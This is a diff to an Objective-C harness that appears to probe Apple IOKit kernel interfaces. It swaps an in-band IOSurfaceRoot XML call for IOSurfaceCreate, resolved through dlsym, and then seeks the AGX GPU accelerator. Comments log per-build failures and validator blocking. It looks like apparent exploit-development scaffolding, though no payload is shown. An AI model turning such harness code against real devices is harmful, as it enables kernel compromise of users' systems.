@@ -15,6 +15,7 @@
 
 #import <Foundation/Foundation.h>
 #import <IOKit/IOKitLib.h>
+#import <IOSurface/IOSurfaceRef.h>
 #import <dlfcn.h>
 #import <fcntl.h>
 #import <unistd.h>
@@ -107,22 +108,45 @@ static NSString * const kNormalXML =
     p174_method_t method = (p174_method_t)dlsym(h, "IOConnectCallMethod");
     p174_close_t closer = (p174_close_t)dlsym(h, "IOServiceClose");
 
-    /* seed surface via IOSurfaceRoot sel 0 (in-band XML) */
-    CFMutableDictionaryRef m = matching("IOSurfaceRoot");
-    io_obj_t rootSvc = getsvc(0, m);
-/* the matching dict is CONSUMED by IOServiceGetMatchingService — no CFRelease (the 20:09 0x11d33-era receipt: CFRelease+84 trap) */
-    io_obj_t rootConn = 0;
-    kern_return_t kr = opener(rootSvc, mach_task_self(), 0, &rootConn);
-    if (kr != KERN_SUCCESS || !rootConn) { Lf(@"[%@] surface root closed — leg void", name); return; }
-    const char *xc = xml.UTF8String;
-    size_t xl = strlen(xc) + 1;
-    uint8_t info[0xc68]; memset(info, 0, sizeof(info));
-    uint32_t isz = sizeof(info);
-    uint64_t sc[1] = {0};
-    kr = method(rootConn, 0, xc, (uint32_t)xl, sc, 1, info, &isz, NULL, NULL);
-    uint32_t sid = isz >= 0x1c ? ((uint32_t *)info)[6] : 0;
-    Lf(@"[%@] seed sid=0x%x (create kr=0x%x)", name, sid, kr);
+    /* v2 (2026-11-24): seed via the PUBLIC IOSurfaceCreate. The in-band
+       IOSurfaceRoot sel0 XML door is dead on BOTH fleet builds (0xfffffecd
+       receipts: 23F77 2026-11-24 09:42 and 24B156 2026-11-23 09:29 — the
+       murk XML route cannot seed anywhere). The XML strings are already
+       property plists: parse -> CFDictionary -> IOSurfaceCreate. */
+    IOSurfaceRef surf = NULL;
+    uint32_t sid = 0;
+    {
+        void *isf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+        IOSurfaceRef (*surfCreate)(CFDictionaryRef) =
+            (IOSurfaceRef (*)(CFDictionaryRef))dlsym(isf, "IOSurfaceCreate");
+        uint32_t (*surfID)(IOSurfaceRef) =
+            (uint32_t (*)(IOSurfaceRef))dlsym(isf, "IOSurfaceGetID");
+        if (surfCreate && surfID) {
+            NSData *xd = [xml dataUsingEncoding:NSUTF8StringEncoding];
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                kCFAllocatorDefault, (__bridge CFDataRef)xd,
+                kCFPropertyListImmutable, NULL, NULL);
+            if (pl && CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
+                surf = surfCreate((CFDictionaryRef)pl);
+                if (surf) {
+                    sid = surfID(surf);
+                    Lf(@"[%@] seed via PUBLIC IOSurfaceCreate sid=0x%x", name, sid);
+                } else {
+                    Lf(@"[%@] public create rejected the property dict "
+                       @"(the F1 shape may be validator-blocked) — leg void", name);
+                }
+                CFRelease(pl);
+            } else {
+                Lf(@"[%@] seed XML parse failed — leg void", name);
+                if (pl) CFRelease(pl);
+            }
+        } else {
+            Lf(@"[%@] IOSurface symbols unresolved — leg void", name);
+        }
+    }
     if (!sid) { Lf(@"[%@] seed failed — leg void", name); return; }
+
+    kern_return_t kr = KERN_SUCCESS;   /* the cycle return (was declared in the removed in-band block) */
 
     /* the AGX accelerator (murk's service list, first hit wins) */
     io_obj_t agx = 0;
